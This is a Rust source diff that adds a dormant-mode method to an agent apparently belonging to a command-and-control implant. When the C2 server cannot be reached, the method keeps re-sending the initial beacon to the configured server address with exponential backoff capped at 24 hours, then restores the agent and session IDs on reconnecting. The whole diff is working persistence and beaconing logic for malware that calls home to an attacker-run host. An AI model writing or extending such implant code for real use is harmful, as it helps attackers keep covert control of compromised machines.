@@ -96,5 +96,35 @@ impl AgentState {
 
     }
 
+    pub async fn offline_mode_key(&mut self, config: &AppConfig, key: Vec<u8>) {
+        // If operating in offline mode, check every X
+        let mut interval_secs = 60; // Start with 1 min
+        let max_interval = 86400; // set cap at 24 hr 
+
+        loop {
+            self.logger.log(&format!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs));
+            tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;
+    
+            let (agent_id, session_id) = beacon::initial_beacon(
+                &config.server_address,
+                config.retries,
+                config.timeout_seconds,
+                &self.logger,
+                &key).await;
+    
+            if agent_id != 0 {
+                self.logger.log("Connected to C2. Exiting offline mode.");
+                self.agent_id = agent_id;
+                self.session_id = session_id;
+                self.offline = false;
+                break;
+            }
+    
+            // Back off retry interval (capped)
+            interval_secs = std::cmp::min(interval_secs * 2, max_interval);
+        }
+
+    }
+
 
 }
